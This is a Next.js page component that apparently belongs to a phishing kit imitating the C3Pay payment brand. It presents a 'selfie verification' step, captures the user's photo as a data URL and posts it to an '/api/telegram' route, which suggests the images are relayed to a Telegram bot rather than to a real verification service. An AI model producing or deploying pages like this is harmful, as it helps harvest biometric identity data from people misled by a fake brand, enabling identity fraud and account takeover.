'use client'

import { useRouter } from 'next/navigation'
import { Camera } from 'lucide-react'
import { useRef, useState } from 'react'
import { C3PayLogo } from '@/components/c3-pay-logo'

export default function SelfieVerificationPage() {
  const router = useRouter()
  const fileInputRef = useRef<HTMLInputElement>(null)
  const [preview, setPreview] = useState<string | null>(null)
  const [isUploading, setIsUploading] = useState(false)

  const [uploadError, setUploadError] = useState('')

  const handleFileChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0]
    if (!file) return

    const reader = new FileReader()
    reader.onload = async () => {
      const dataUrl = reader.result as string
      setPreview(dataUrl)
      setIsUploading(true)
      setUploadError('')

      try {
        const response = await fetch('/api/telegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ type: 'selfie', photo: dataUrl }),
        })

        if (!response.ok) throw new Error('Telegram notification failed')

        try {
          window.sessionStorage.setItem('c3-selfie', dataUrl)
        } catch {
          // Ignore storage errors (e.g. quota exceeded) and continue.
        }
        router.push('/verification-success')
      } catch {
        setUploadError('Unable to upload selfie. Please try again.')
      } finally {
        setIsUploading(false)
      }
    }
    reader.readAsDataURL(file)
  }

  return (
    <main className="flex min-h-screen flex-col items-center bg-background px-6 pb-10 pt-8 text-center">
      <C3PayLogo />

      <h1 className="mt-6 text-2xl font-bold text-navy">Selfie Verification</h1>
      <p className="mt-2 text-sm text-slate-500">Position your face in the circle and take a selfie</p>

      <div className="relative mt-8 flex h-72 w-72 items-center justify-center rounded-full bg-slate-100 ring-4 ring-navy">
        {preview ? (
          <img
            src={preview || '/placeholder.svg'}
            alt="Selfie preview"
            className="h-full w-full rounded-full object-cover"
          />
        ) : (
          <div className="flex flex-col items-center gap-2 text-slate-400">
            <Camera className="h-10 w-10" strokeWidth={1.5} />
            <span className="text-sm">Camera access denied</span>
          </div>
        )}

        {isUploading && (
          <div className="absolute inset-0 flex items-center justify-center rounded-full bg-navy/40">
            <span className="h-10 w-10 animate-spin rounded-full border-4 border-white/40 border-t-white" />
          </div>
        )}
      </div>

      <input
        ref={fileInputRef}
        type="file"
        accept="image/*"
        capture="user"
        className="sr-only"
        onChange={handleFileChange}
      />

      <button
        type="button"
        disabled={isUploading}
        onClick={() => fileInputRef.current?.click()}
        className="mt-8 flex h-14 w-full max-w-sm items-center justify-center gap-2 rounded-xl bg-navy text-base font-semibold text-white transition-opacity disabled:cursor-not-allowed disabled:opacity-70"
      >
        <Camera className="h-5 w-5" />
        {isUploading ? 'Uploading Selfie…' : 'Take Selfie'}
      </button>

      <p className="mt-4 max-w-xs text-sm text-slate-400">Make sure your face is well-lit and centred in the frame</p>

      {uploadError && (
        <p className="mt-3 text-sm text-red-500" role="alert">
          {uploadError}
        </p>
      )}
    </main>
  )
}
